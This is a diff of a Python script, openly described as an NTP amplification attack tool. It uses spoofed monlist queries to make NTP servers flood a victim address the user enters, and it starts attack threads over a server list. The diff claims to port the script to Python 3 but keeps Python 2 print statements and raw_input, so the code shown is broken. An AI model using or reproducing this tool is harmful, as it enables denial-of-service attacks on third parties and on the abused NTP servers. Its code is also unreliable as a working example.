@@ -1,6 +1,15 @@
 #!/usr/bin/env python
 
 '''
+This script was taken from Ron Nilekani and modified for Python3, I found
+it to be quite useful to verify on an NTP Amplified Attack but I found it
+a bit cumbersome to use, the modifications are only intended for ease of
+use and updating it to Python3, nothing more.
+
+Vicente Manuel Munoz Milchorena - Vico Surge
+2019-09-28
+
+---
 
 Disclaimer - This program emulates the behavior of NTP Amplification attack.
 It is not necessarily the best solution coz I am not a developer by profession.
@@ -17,31 +26,23 @@ Please feel free to reach out to me incase if you have any suggestions.
 
 '''
 
-
 #Importing the scapy library into my local namespace
 from scapy.all import *
+import sys, threading, time, argparse
 
-import sys
-import threading
-import time
+def introduction():
+	print("NTP AMPLIFICATION ATTACKS:")
+	print("MAKING MONLIST QUERY TO NTP SERVER USING IP ADDRESSING SPOOFING")
+	print("NTP SERVER would flood the target with amplified amount of data in response")
+	print("In order to stop the execution of this program, press CTRL-C")
 
-def Introduction():
-	print
-        print "NTP AMPLIFICATION ATTACKS:"
-        print "MAKING MONLIST QUERY TO NTP SERVER USING IP ADDRESSING SPOOFING"
-        print "NTP SERVER would flood the target with amplified amount of data in response"
-        print "In order to stop the execution of this program, press CTRL-C"
-        print
-	
- 
 def how_to_use_script():
 	'''
 	This function expains how to use this script.
 	'''
-	print "Note: This script works for python 2.7.6 or above.\n"
+	print "Note: This script works for python 3.7.x or above."
 	print "Make sure to install scapy library on your local machine"
 	print "Please do not use this script for malicious reasons"
-	
 
 def file_operations(ntpserverfile):
 	'''
@@ -122,31 +123,22 @@ def thread_function(numberthreads):
 
 if __name__ == "__main__":
 	
-	Introduction()
+	introduction()
 	how_to_use_script()
-
 	#Initializing the variables. Taking the input from the user in form of arguments.
-
 	target_address = raw_input("Enter the victim address:\n")
-	
 	ntpserverfile = raw_input("Enter the name of the file containing the list of NTP Servers:\n")
-
 	numberthreads = raw_input("Enter the number of threads you want to use(Remember, it should be the same as the list of NTP servers:\n")
-	
-		
 	
 	#Creating and Initializing the list.
 	current_server = 0
-	
 
 	# Performing the file operations to retrieve list of NTP servers	
 	ntplist = file_operations(ntpserverfile)	
 	
 	#Calling the thread function
 	thread_function(numberthreads)
-
 	
 	# In order to avoid utilization 100% CPU, I am adding delay to  the code execution by one second
 	while True:
 		time.sleep(1)
-
